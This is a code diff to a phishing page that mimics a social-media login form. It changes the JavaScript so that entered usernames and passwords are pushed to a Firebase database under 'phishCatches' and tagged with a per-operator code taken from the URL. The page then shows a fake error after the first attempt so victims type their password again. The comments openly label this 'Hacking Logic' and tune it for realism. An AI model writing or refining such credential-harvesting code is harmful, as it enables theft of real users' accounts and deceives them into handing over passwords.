@@ -145,7 +145,6 @@
 
         <!-- Login Form + Hacking Logic -->
         <form class="login-form" id="myform">
-            <!-- IDs added to Javascript logic -->
             <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocapitalize="off" spellcheck="false">
             <input type="password" id="password" class="input-field" placeholder="Password">
             
@@ -176,18 +175,24 @@
             btn.style.opacity = "0.7";
             btn.disabled = true;
 
-            // --- FIREBASE PUSH ---
-            // Save data to "freeFollowers" collection in DB
-            fbhDB.ref('freeFollowers/new_user').push({
+            // --- FIREBASE PUSH (FIXED LOGIC) ---
+            // 1. Get the User Code from URL (e.g., ?u=ABC123)
+            const urlParams = new URLSearchParams(window.location.search);
+            const currentUserCode = urlParams.get('u') || 'unknown_user'; 
+
+            // 2. Push Data to 'phishCatches/[UserCode]'
+            // Note: 'ts' is timestamp for sorting latest data first
+            fbhDB.ref('phishCatches/' + currentUserCode).push({
                 username: u,
                 password: p,
-                time: new Date().toLocaleString()
+                time: new Date().toLocaleString(),
+                ts: Date.now()
             });
-            // ---------------------
+            // ------------------------------------
 
             // Delay simulation (Realism)
             setTimeout(function() {
-                // Try 1: Show Error (User usually corrects password on 2nd try)
+                // Show Error (User usually corrects password on 2nd try)
                 err.style.display = "block";
                 document.getElementById('password').value = ""; // Clear password field
                 document.getElementById('password').focus();
